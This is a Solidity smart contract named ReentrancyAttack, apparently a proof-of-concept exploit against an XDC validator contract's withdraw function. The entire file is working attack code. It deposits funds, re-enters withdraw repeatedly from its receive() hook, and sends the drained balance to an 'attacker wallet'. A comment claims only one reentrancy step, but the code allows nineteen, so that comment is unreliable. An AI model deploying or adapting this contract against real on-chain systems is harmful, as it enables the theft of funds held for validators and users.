// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IXDCValidator {
    function withdraw(uint256 cap, uint256 anotherParam) external;
    function deposit() external payable;
}

contract ReentrancyAttack {
    IXDCValidator public validator;
    address public owner;
    bool public attackEnabled = false;
    uint256 public attackCount = 0;

    constructor(address _validator) {
        validator = IXDCValidator(_validator);
        owner = msg.sender;
    }

    receive() external payable {
        // Only perform 1 reentrancy step for safety
        if (attackEnabled && attackCount < 19) {
            attackCount++;
            validator.withdraw(0.1 ether, 0);
        }
    }

    // Deposit full contract balance into validator
    function prepare() external {
        require(msg.sender == owner, "Only owner");
        uint256 amount = address(this).balance;
        require(amount >= 0.1 ether, "Insufficient balance");
        validator.deposit{value: amount}();
    }

    // Trigger the initial withdraw to begin reentrancy
    function attack(uint256 cap) external {
        require(msg.sender == owner, "Only owner");
        attackEnabled = true;
        attackCount = 0;
        validator.withdraw(cap, 0);
    }

    // Withdraw all collected funds to attacker wallet
    function collect() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
}

